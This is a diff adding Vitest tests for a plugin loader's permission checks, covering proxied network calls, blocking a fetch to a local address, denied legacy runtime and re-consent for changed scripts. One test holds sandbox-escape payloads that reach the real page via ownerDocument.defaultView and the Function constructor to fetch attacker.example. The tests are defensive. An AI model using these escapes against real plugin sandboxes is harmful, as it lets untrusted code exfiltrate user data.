@@ -11,6 +11,10 @@ const pluginImportMocks = vi.hoisted(() => ({
   sleep: vi.fn(),
 }))
 
+const pluginPermissionMocks = vi.hoisted(() => ({
+  getPluginPermission: vi.fn(async () => true),
+}))
+
 function createUtilMock() {
   return {
     BufferToText: (data: Uint8Array) => new TextDecoder().decode(data),
@@ -70,8 +74,12 @@ vi.mock('./apiV3/v3.svelte', () => ({
   loadV3Plugins: vi.fn(async () => undefined),
 }))
 
+vi.mock('./pluginPermissions', () => ({
+  getPluginPermission: pluginPermissionMocks.getPluginPermission,
+}))
+
 vi.mock('./pluginSafety', () => ({
-  checkCodeSafety: vi.fn(async () => ({ isSafe: true, errors: [] })),
+  checkCodeSafety: vi.fn(async (script: string) => ({ isSafe: true, errors: [], modifiedCode: script })),
 }))
 
 import {
@@ -368,6 +376,8 @@ beforeEach(() => {
   pluginImportMocks.selectSingleFile.mockReset()
   pluginImportMocks.sleep.mockReset()
   pluginImportMocks.sleep.mockResolvedValue(undefined)
+  pluginPermissionMocks.getPluginPermission.mockReset()
+  pluginPermissionMocks.getPluginPermission.mockResolvedValue(true)
   vi.mocked(loadV3Plugins).mockClear()
   setResourceWriteGuardEnabled(false)
   setDatabaseLite({
@@ -933,6 +943,116 @@ describe('V2 plugin unload lifecycle', () => {
 
     expectPluginV2RegistrationsCleared()
     await expect(loadV2Plugin([])).resolves.toBeUndefined()
+  })
+
+  it('keeps delayed V2.1 network calls bound to each script after another plugin becomes ambient', async () => {
+    const firstScript = `setTimeout(() => fetch('https://first.example.test/data'), 10)`
+    const secondScript = `fetch('https://second.example.test/data')`
+    const first = seedPlugin('first-plugin', { version: '2.1', script: firstScript })
+    const second = seedPlugin('second-plugin', { version: '2.1', script: secondScript })
+    const fetchCalls: Array<{ url: string; init: RequestInit }> = []
+    vi.stubGlobal(
+      'fetch',
+      vi.fn(async (input: RequestInfo | URL, init: RequestInit = {}) => {
+        fetchCalls.push({ url: String(input), init })
+        return new Response('ok')
+      }),
+    )
+    const log = vi.spyOn(console, 'log').mockImplementation(() => undefined)
+
+    await loadV2Plugin([first, second])
+    await vi.waitFor(() => expect(pluginPermissionMocks.getPluginPermission).toHaveBeenCalledTimes(4))
+    await vi.waitFor(() => expect(fetchCalls).toHaveLength(2))
+
+    expect(pluginPermissionMocks.getPluginPermission.mock.calls).toEqual(
+      expect.arrayContaining([
+        [first.name, 'legacyRuntime', false, first.script],
+        [second.name, 'legacyRuntime', false, second.script],
+        [first.name, 'network', false, first.script, expect.any(Function)],
+        [second.name, 'network', false, second.script, expect.any(Function)],
+      ]),
+    )
+    expect(fetchCalls.every((call) => call.url === '/api/v1/proxy/plugin-fetch')).toBe(true)
+    const upstreamUrls = fetchCalls.map((call) =>
+      decodeURIComponent((call.init.headers as Record<string, string>)['risu-url']),
+    )
+    expect(upstreamUrls).toEqual(
+      expect.arrayContaining(['https://first.example.test/data', 'https://second.example.test/data']),
+    )
+    log.mockRestore()
+  })
+
+  it('blocks a bare V2.1 fetch to a private target before consent or browser networking', async () => {
+    const script = `fetch('http://127.0.0.1:6419/api/v1/bootstrap').catch(() => {})`
+    const plugin = seedPlugin('private-fetch-plugin', { version: '2.1', script })
+    const browserFetch = vi.fn(async () => new Response('unexpected'))
+    vi.stubGlobal('fetch', browserFetch)
+    const log = vi.spyOn(console, 'log').mockImplementation(() => undefined)
+
+    await loadV2Plugin([plugin])
+    await new Promise((resolve) => setTimeout(resolve, 0))
+
+    expect(pluginPermissionMocks.getPluginPermission).toHaveBeenCalledOnce()
+    expect(pluginPermissionMocks.getPluginPermission).toHaveBeenCalledWith(
+      plugin.name,
+      'legacyRuntime',
+      false,
+      plugin.script,
+    )
+    expect(browserFetch).not.toHaveBeenCalled()
+    log.mockRestore()
+  })
+
+  it('skips a V2.1 script entirely when trusted legacy runtime access is denied', async () => {
+    const script = `globalThis.__deniedV2Ran = true`
+    const plugin = seedPlugin('denied-legacy-plugin', { version: '2.1', script })
+    pluginPermissionMocks.getPluginPermission.mockResolvedValue(false)
+    const warn = vi.spyOn(console, 'warn').mockImplementation(() => undefined)
+
+    await loadV2Plugin([plugin])
+
+    expect((globalThis as any).__deniedV2Ran).toBeUndefined()
+    expect(pluginPermissionMocks.getPluginPermission).toHaveBeenCalledWith(plugin.name, 'legacyRuntime', false, script)
+    warn.mockRestore()
+  })
+
+  it('requests trusted legacy runtime access again for a changed script', async () => {
+    const first = seedPlugin('changing-legacy-plugin', { version: '2.1', script: `void 'first'` })
+    const second = seedPlugin('changing-legacy-plugin', { version: '2.1', script: `void 'second'` })
+    const log = vi.spyOn(console, 'log').mockImplementation(() => undefined)
+
+    await loadV2Plugin([first])
+    await loadV2Plugin([second])
+
+    expect(pluginPermissionMocks.getPluginPermission.mock.calls).toEqual(
+      expect.arrayContaining([
+        [first.name, 'legacyRuntime', false, first.script],
+        [second.name, 'legacyRuntime', false, second.script],
+      ]),
+    )
+    log.mockRestore()
+  })
+
+  it('documents that an approved V2.1 runtime remains trusted main-page code', async () => {
+    const script = `
+      safeDocument['body']['ownerDocument']['defaultView']['fetch']('https://attacker.example/dom-bypass')
+      ;({})['constructor']['constructor']('return this')()['fetch']('https://attacker.example/function-bypass')
+    `
+    const plugin = seedPlugin('trusted-main-realm-plugin', { version: '2.1', script })
+    const browserFetch = vi.fn(async (_input: RequestInfo | URL) => new Response('ok'))
+    vi.stubGlobal('fetch', browserFetch)
+    const log = vi.spyOn(console, 'log').mockImplementation(() => undefined)
+
+    await loadV2Plugin([plugin])
+    await vi.waitFor(() => expect(browserFetch).toHaveBeenCalledTimes(2))
+
+    expect(browserFetch.mock.calls.map(([url]) => url)).toEqual([
+      'https://attacker.example/dom-bypass',
+      'https://attacker.example/function-bypass',
+    ])
+    expect(pluginPermissionMocks.getPluginPermission).toHaveBeenCalledOnce()
+    expect(pluginPermissionMocks.getPluginPermission).toHaveBeenCalledWith(plugin.name, 'legacyRuntime', false, script)
+    log.mockRestore()
   })
 })
 
